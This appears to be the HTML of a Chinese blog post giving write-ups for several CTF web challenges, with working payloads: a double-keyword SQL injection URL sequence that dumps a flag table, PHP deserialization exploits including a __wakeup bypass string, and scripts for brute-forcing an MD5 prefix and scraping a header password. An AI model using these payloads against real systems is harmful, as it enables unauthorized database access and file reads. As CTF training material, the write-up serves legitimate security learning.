@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web1题目代码  看到extract函数，联想到常见的变量覆盖漏洞 根据我以前写的文章 点击链接 可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做  web11打开题目显示如下  标题为robots,尝试访问robots.txt，访问后提示我们shell.php 访问shell.php  这块校验和西湖论剑的留言板题目很像，爆破脚本 import hashlib  def md">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="newbugku部分web题解">
+<meta property="og:url" content="https://yml-sec.top/2019/04/26/newbugku部分web题解/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="web1题目代码  看到extract函数，联想到常见的变量覆盖漏洞 根据我以前写的文章 点击链接 可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做  web11打开题目显示如下  标题为robots,尝试访问robots.txt，访问后提示我们shell.php 访问shell.php  这块校验和西湖论剑的留言板题目很像，爆破脚本 import hashlib  def md">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc042e715786.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc043e5b6134.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc04468e9783.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc044e078932.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc04592606ed.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc045d242c54.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc0496dde0a3.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc04b22f2c91.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc04d9db966e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc06384e1735.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc0641c8b186.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc0657ba5f3e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc0663506a9b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cc0669a05155.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc18d8d55db0.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc18e0b63f2c.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc19184715ef.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc191e2f32ce.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc191fa729ea.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1926b02693.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc192c3dc749.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1a47da8241.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1a4a1e19b4.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1ac3771ed1.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1ac1f0c97c.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1acf962c35.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1ad233962e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b2ac58ffb.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b3ac65c31.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b3d535e60.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b412448b6.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b4375909b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b57d73424.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b5ccba3f9.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b64eddc0b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b7a097603.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b87d4de7b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1b8c2a2254.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1bf2dedb6e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1bf9bd56ea.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/25/5cc1bfed2af41.jpg">
+<meta property="og:updated_time" content="2019-04-26T06:39:00.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="newbugku部分web题解">
+<meta name="twitter:description" content="web1题目代码  看到extract函数，联想到常见的变量覆盖漏洞 根据我以前写的文章 点击链接 可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做  web11打开题目显示如下  标题为robots,尝试访问robots.txt，访问后提示我们shell.php 访问shell.php  这块校验和西湖论剑的留言板题目很像，爆破脚本 import hashlib  def md">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/24/5cc042e715786.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2019/04/26/newbugku部分web题解/">
+
+
+
+
+
+  <title>newbugku部分web题解 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/04/26/newbugku部分web题解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">newbugku部分web题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-26T14:38:10+08:00">
+                2019-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>题目代码</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc042e715786.png" alt="code.png"></p>
+<p>看到extract函数，联想到常见的变量覆盖漏洞</p>
+<p>根据我以前写的文章</p>
+<p><a href="点击链接" title="https://yml-sec.top/2019/03/31/%E6%B5%85%E8%B0%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">点击链接</a></p>
+<p>可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc043e5b6134.jpg" alt="18.jpg"></p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>打开题目显示如下</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc04468e9783.jpg" alt="19.jpg"></p>
+<p>标题为robots,尝试访问robots.txt，访问后提示我们shell.php</p>
+<p>访问shell.php</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc044e078932.jpg" alt="20.jpg"></p>
+<p>这块校验和西湖论剑的留言板题目很像，爆破脚本</p>
+<pre><code>import hashlib
+
+def md5(key):
+    m = hashlib.md5()
+    m.update(key.encode(&apos;utf-8&apos;))
+    return m.hexdigest()
+
+for i in range(1000000000):
+    if md5(str(i))[0:6] == &apos;dc7dc4&apos;:
+        print(i)
+        break
+</code></pre><p>结果如下</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc04592606ed.jpg" alt="21.jpg"></p>
+<p>输入爆破出来的数字即可得到flag</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc045d242c54.jpg" alt="22.jpg"></p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>提交数据抓包，发现了base64加密的password</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc0496dde0a3.jpg" alt="23.jpg"></p>
+<p>解密后是一个flag,但是提交发现并不正确，仔细观察数据包会发现一个hint</p>
+<pre><code>Hint: Seeing is not believing, maybe you need to be faster!
+</code></pre><p>尝试将假flag中的字符串当做密码提交</p>
+<p><img src="https://i.loli.net/2019/04/24/5cc04b22f2c91.jpg" alt="24.jpg"></p>
+<p>提示我们要快一些，这样写脚本就可以了</p>
+<pre><code>import requests
+import base64
+import re
+url = &quot;http://123.206.31.85:10013/index.php&quot;
+s = requests.session()
+html = s.post(url,data={&quot;password&quot;:&quot;123456&quot;})
+#print(html.text)
+password1 = html.headers[&apos;password&apos;]
+password2 = base64.b64decode(password1)
+re_str = re.compile(&apos;flag{(.*?)}&apos;,re.S)
+password = re.findall(re_str,str(password2))
+print(password[0])
+html = s.post(url,data={&quot;password&quot;:password[0]})
+print(html.text)
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc04d9db966e.jpg" alt="25.jpg"></p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>题目是一道sql注入，过滤了and or select union 这些可用双写绕过</p>
+<p>判断列数</p>
+<pre><code>http://123.206.31.85:10018/list.php?id=2&apos; oorrder by 3--+
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06384e1735.jpg" alt="27.jpg"></p>
+<p>在判断为4时页面无返回</p>
+<p>所以我们得到列数为3</p>
+<p>查询数据库名</p>
+<pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,database(),3--+
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0641c8b186.jpg" alt="28.jpg"></p>
+<p>查询表名</p>
+<pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&apos;web18&apos;--+
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0657ba5f3e.jpg" alt="29.jpg"></p>
+<p>查询列名</p>
+<pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&apos;flag&apos;--+
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0663506a9b.jpg" alt="30.jpg"></p>
+<p>获取flag</p>
+<pre><code>http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,flag,3 from flag--+
+</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc0669a05155.jpg" alt="31.jpg"></p>
+<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>题目如下</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc18d8d55db0.jpg" alt="32.jpg"></p>
+<p>常规编写脚本即可，key=密文</p>
+<pre><code>import requests
+import re
+while(1):
+    url = &quot;http://123.206.31.85:10020/&quot;
+    s = requests.session()
+    html = s.get(url)
+    re1 = re.compile(&apos;¼(.*?)&lt;br/&gt;&apos;,re.S)
+    result = re.findall(re1,html.text)
+    url2 = url+&quot;?key=&quot;+result[0]
+    html1 = s.get(url2)
+    print(html1.text)
+</code></pre><p>有一点要注意，这题目的flag是有几率出现的，需要多跑几次</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc18e0b63f2c.jpg" alt="33.jpg"></p>
+<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>定位到上传界面</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc19184715ef.jpg" alt="34.jpg"></p>
+<p>观察链接联想到文件包含漏洞，可以使用伪协议读取</p>
+<p>用扫描器扫描发现flag.php文件，开始利用伪协议读取</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc191e2f32ce.jpg" alt="35.jpg"></p>
+<p>解密后得到flag</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc191fa729ea.jpg" alt="36.jpg"></p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目是一个登录框，尝试使用万能密码登录</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1926b02693.jpg" alt="37.jpg"></p>
+<p>提交后竟然登录成功。。。。。</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc192c3dc749.jpg" alt="38.jpg"></p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>提示vim编辑器，想到临时文件swp</p>
+<p>输入swp提交</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1a47da8241.jpg" alt="40.jpg"></p>
+<p>将1改为i成功解出题目</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1a4a1e19b4.jpg" alt="39.jpg"></p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>访问题目查看源码</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1ac3771ed1.jpg" alt="41.jpg"></p>
+<p>读取class.php的源码</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1ac1f0c97c.jpg" alt="42.jpg"></p>
+<pre><code>&lt;?php
+error_reporting(E_ALL &amp; ~E_NOTICE);
+
+class Read{//f1a9.php
+    public $file;
+    public function __toString(){
+        if(isset($this-&gt;file)){
+            echo file_get_contents($this-&gt;file);    
+        }
+        return &quot;__toString was called!&quot;;
+    }
+}
+?&gt;
+</code></pre><p>提示我们有f1a9.php，这段代码可用反序列化利用</p>
+<pre><code>&lt;?php
+error_reporting(E_ALL &amp; ~E_NOTICE);
+
+class Read{//f1a9.php
+    public $file = &quot;f1a9.php&quot;;
+    public function __toString(){
+        if(isset($this-&gt;file)){
+            echo file_get_contents($this-&gt;file);    
+        }
+        return &quot;__toString was called!&quot;;
+    }
+}
+$a = new Read;
+echo serialize($a);
+?&gt;
+</code></pre><p><img src="https://i.loli.net/2019/04/25/5cc1acf962c35.jpg" alt="43.jpg"></p>
+<p>最后payload</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1ad233962e.jpg" alt="44.jpg"></p>
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>题目主页面如下</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b2ac58ffb.jpg" alt="46.jpg"></p>
+<p>使用扫面器扫出如下页面</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b3ac65c31.jpg" alt="47.jpg"></p>
+<p>readme.txt有如下提示</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b3d535e60.jpg" alt="48.jpg"></p>
+<p>用户名是admin 密码是三位数字，我们可以用burp爆破</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b412448b6.jpg" alt="49.jpg"></p>
+<p>成功登陆后得到flag</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b4375909b.jpg" alt="45.jpg"></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>注册登陆后，提示权限不够</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b57d73424.jpg" alt="50.jpg"></p>
+<p>尝试抓包</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b5ccba3f9.jpg" alt="51.jpg"></p>
+<p>看到u和r的前几位是一样的，后面不一样的部分像是MD5加密后的字符串</p>
+<p>在线解了一下</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b64eddc0b.jpg" alt="52.jpg"></p>
+<p>尝试把两个部分都换成admin的MD5加密字符串</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b7a097603.jpg" alt="53.jpg"></p>
+<p>得到FLAG</p>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>题目如下</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b87d4de7b.jpg" alt="54.jpg"></p>
+<p>查看源码</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1b8c2a2254.jpg" alt="55.jpg"></p>
+<pre><code>class Time{
+    public $flag = ******************;
+    public $truepassword = ******************;
+    public $time;
+    public $password ;
+    public function __construct($tt, $pp) {
+    $this-&gt;time = $tt;
+    $this-&gt;password = $pp;
+    }
+    function __destruct(){
+        if(!empty($this-&gt;password))
+        {
+            if(strcmp($this-&gt;password,$this-&gt;truepassword)==0){
+                echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;
+                if(!empty($this-&gt;time)){
+                    if(!is_numeric($this-&gt;time)){
+                        echo &apos;Sorry.&lt;br&gt;&apos;;
+                        show_source(__FILE__);
+                    }
+                    else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66){
+                        echo &apos;you need a bigger time.&lt;br&gt;&apos;;
+                    }
+                    else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11){
+                        echo &apos;you need a smaller time.&lt;br&gt;&apos;;
+                    }
+                    else{
+                        sleep((int)$this-&gt;time);
+                        var_dump($this-&gt;flag);
+                    }
+                    echo &apos;&lt;hr&gt;&apos;;
+                }
+                else{
+                    echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;;
+                }
+            }
+            else{
+                echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;;
+            }
+        }
+        else{
+            echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;
+        }
+    }
+    function __wakeup(){
+        $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;;
+    }
+}
+if(isset($_GET[&apos;rua&apos;])){
+    $rua = $_GET[&apos;rua&apos;];
+    @unserialize($rua);
+}
+else{
+    echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;;
+}
+</code></pre><p>常规的反序列化操作，计算符合条件的时间</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1bf2dedb6e.jpg" alt="56.jpg"></p>
+<p>exp</p>
+<pre><code>&lt;?php
+class Time{
+    public $time;
+    public $password;
+    public function __construct($tt, $pp) {
+    $this-&gt;time = $tt;
+    $this-&gt;password = $pp;
+    }
+}
+
+$password = array(0=&gt;&apos;yml&apos;);
+$time = &apos;0x4c06f351&apos;;
+$yml = new Time($time,$password);
+
+echo serialize($yml);
+
+?&gt;
+</code></pre><p>payload</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1bf9bd56ea.jpg" alt="57.jpg"></p>
+<p>绕过wakeup</p>
+<pre><code>O:4:&quot;Time&quot;:3:{s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:{i:0;s:3:&quot;yml&quot;;}}
+</code></pre><p>得到flag</p>
+<p><img src="https://i.loli.net/2019/04/25/5cc1bfed2af41.jpg" alt="58.jpg"></p>
+<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/14/Z3简介及在逆向领域的应用/" rel="next" title="Z3简介及在逆向领域的应用">
+                <i class="fa fa-chevron-left"></i> Z3简介及在逆向领域的应用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">2.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">3.</span> <span class="nav-text">web13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web18"><span class="nav-number">4.</span> <span class="nav-text">web18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web20"><span class="nav-number">5.</span> <span class="nav-text">web20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web25"><span class="nav-number">6.</span> <span class="nav-text">web25</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">7.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 